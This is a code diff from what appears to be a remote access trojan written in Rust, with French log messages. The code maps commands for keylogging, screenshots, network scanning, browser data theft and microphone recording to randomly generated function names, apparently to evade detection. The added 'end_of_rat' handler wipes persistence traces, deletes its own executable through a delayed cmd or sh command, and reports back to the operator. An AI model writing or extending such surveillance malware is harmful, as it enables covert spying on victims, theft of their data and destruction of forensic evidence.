@@ -30,6 +30,7 @@ pub fn init_polymorph_functions() {
     let network_scan_name = generate_fn_name();
     let browser_info_name = generate_fn_name();
     let mic_rec_name = generate_fn_name();
+    let end_of_rat_name = generate_fn_name();
 
     cmd_map.insert("keylogger", keylogger_name.clone());
     cmd_map.insert("screenshot", screenshot_name.clone());
@@ -38,6 +39,7 @@ pub fn init_polymorph_functions() {
     cmd_map.insert("network_scan", network_scan_name.clone());
     cmd_map.insert("browser_info", browser_info_name.clone());
     cmd_map.insert("mic_rec", mic_rec_name.clone());
+    cmd_map.insert("end_of_rat", end_of_rat_name.clone());
 
     poly_map.insert(keylogger_name.clone(), Box::new(|alias| Box::pin(keylogger_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
     poly_map.insert(screenshot_name.clone(), Box::new(|alias| Box::pin(screenshot_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
@@ -46,6 +48,7 @@ pub fn init_polymorph_functions() {
     poly_map.insert(network_scan_name.clone(), Box::new(|alias| Box::pin(network_scan_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
     poly_map.insert(browser_info_name.clone(), Box::new(|alias| Box::pin(browser_info_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
     poly_map.insert(mic_rec_name.clone(), Box::new(|alias| Box::pin(mic_rec_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
+    poly_map.insert(end_of_rat_name.clone(), Box::new(|alias| Box::pin(end_of_rat_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>) as PolyFunc);
 
     println!("Noms polymorphiques générés :");
     println!("- keylogger: {}", keylogger_name);
@@ -55,6 +58,7 @@ pub fn init_polymorph_functions() {
     println!("- network_scan: {}", network_scan_name);
     println!("- browser_info: {}", browser_info_name);
     println!("- mic_rec: {}", mic_rec_name);
+    println!("- end_of_rat: {}", end_of_rat_name);
 
     let _ = FUNCTION_MAP.set(poly_map);
     let _ = COMMAND_MAP.set(cmd_map);
@@ -142,6 +146,31 @@ async fn mic_rec_wrapper(alias: String) {
             let _ = connexion::send_directive_status(&alias, "error", &e.to_string()).await;
         }
     }
+}
+
+async fn end_of_rat_wrapper(alias: String) {
+    println!("[{}] Suppression du programme (end_of_rat)...", alias);
+    #[cfg(target_os = "windows")]
+    {
+        crate::persistance::remove_all_traces();
+        use std::process::Command;
+        let exe_path = std::env::current_exe().unwrap();
+        let _ = Command::new("cmd")
+            .args(["/C", &format!("timeout 1 && del /F /Q \"{}\"", exe_path.display())])
+            .spawn();
+    }
+    #[cfg(target_os = "linux")]
+    {
+        crate::persistance::remove_all_traces();
+        use std::process::Command;
+        let exe_path = std::env::current_exe().unwrap();
+        let _ = Command::new("sh")
+            .arg("-c")
+            .arg(format!("sleep 1 && rm -f '{}'", exe_path.display()))
+            .spawn();
+    }
+    let _ = connexion::send_directive_status(&alias, "success", "Programme supprimé").await;
+    std::process::exit(0);
 }
 
 pub async fn execute_poly_command(command: &str) {
